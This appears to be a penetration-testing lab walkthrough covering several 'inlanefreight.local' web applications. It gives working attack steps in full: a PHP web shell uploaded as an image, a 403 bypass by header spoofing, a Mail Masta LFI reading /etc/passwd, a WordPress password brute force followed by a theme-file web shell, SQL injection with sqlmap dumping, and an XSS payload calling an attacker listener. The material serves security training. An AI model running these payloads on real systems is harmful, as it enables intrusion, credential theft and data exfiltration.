# careers.inlanefreight.local
I entered that web application, enumerate. I registered and after registration i noticed url like: http://careers.inlanefreight.local/profile?id=9

I tried to brute force and found IDOR vulnerability.

# dev.inlanefreight.local
I tried to gobuster for enumerate .php files:
```bash
gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
```

## output:
```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.inlanefreight.local
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/06/20 22:04:48 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]
/.hta.php             (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]                                            
/index.php            (Status: 200) [Size: 2048]                                            
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]    
/server-status        (Status: 403) [Size: 288]                                             
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/upload.php           (Status: 200) [Size: 14]                                               
/.htaccess.php        (Status: 403) [Size: 288]                                              
                                                                                             
===============================================================
2022/06/20 22:05:02 Finished
===============================================================
```

When I tried to enter **/upload.php** directory it said **403 forbidden** which is very suspicious because output of gobuster is **Status 200** 
I tried to use **Brute Force** to change request method every method gave me error except **TRACKING**

![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/3d64cb64-0bf8-44cf-bf3b-76e1efaa15f8)

Next time I tried to enter `X-Custom-IP-Authorization: 127.0.0.1` to request and this happened:

![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/ebd06bcd-88b3-4ffa-98a4-addadf47f481)

If we right-click anywhere in the Response window in Repeater we can select show response in browser, copy the resultant URL and request it in the browser we are using with the Burp proxy. A photo editing platform loads for us.

Then I tried to use shell .php file with following content: `<?php system($_GET['cmd']); ?>`  I changed Content type to `Content-Type: image/png` then I can use curl to shell.

# ir.inlanefreight.local

This web application seems like wordpress.
Let's fire up WPScan and see what we can enumerate using the -ap flag to enumerate all plugins.

```bash
sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
```
## Output:
```bash
[+] WordPress version 6.0 identified (Latest, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Latest Version: 0.7 (up to date)
 | Last Updated: 2022-04-25T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] b2i-investor-tools
 | Location: http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
 | Latest Version: 1.0.5 (up to date)
 | Last Updated: 2022-06-17T15:21:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.5 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:07:09 2022
[+] Requests Done: 35
[+] Cached Requests: 7
[+] Data Sent: 9.187 KB
[+] Data Received: 164.854 KB
[+] Memory used: 224.816 M
```
I can see old Mail Masta plugin installed we can use LFI vulnerability like this:
```bash
curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/1aa89154-d189-4562-a351-6b0ef8b5717e)

## Next enumerating users:
```bash
wpscan -e u -t 500 --url http://ir.inlanefreight.local
```
Valid users: ilfreightwp, tom, james, jhon
## Brute force password:
```bash
wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
```
Password: password1
Very weak password next job is obivious login, editing 404.php from twenty twenty `<?php system($_GET['cmd']); ?>`
Then web shell:
`curl http://ir.inlanefreight.local/themes/twentytwenty/404.php?cmd=id` or direct link

# status.inlanefreight.local

Next web application has sql injection vulnerabilitiy in it's search box
`' union select null, database(), user(), @@version -- //`

I took this burp suite request and save slqi.txt file:
```bash
POST / HTTP/1.1
Host: status.inlanefreight.local
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://status.inlanefreight.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://status.inlanefreight.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=s4nm572fgeaheb3lj86ha43c3p
Connection: close

searchitem=*
```
Then I used this command using sqlmap:
```bash
 sqlmap -r sqli.txt --dbms=mysql
```
After finding database and table:
```bash
sqlmap -r sqli.txt --dbms=mysql -D status --tables --dump
```
# support.inlanefreight.local

It has **XXE** vulnerability of message filed from **/ticket.php** page
```bash
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```
we will wait nc listener:
`nc -lvnp 9000`

After executing above payload we have:
```bash
listening on [any] 9000 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.101] 56202
GET /TESTING_THIS%3C/script HTTP/1.1
Host: 10.10.14.15:9000
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```
Confirm it has vulnerability.


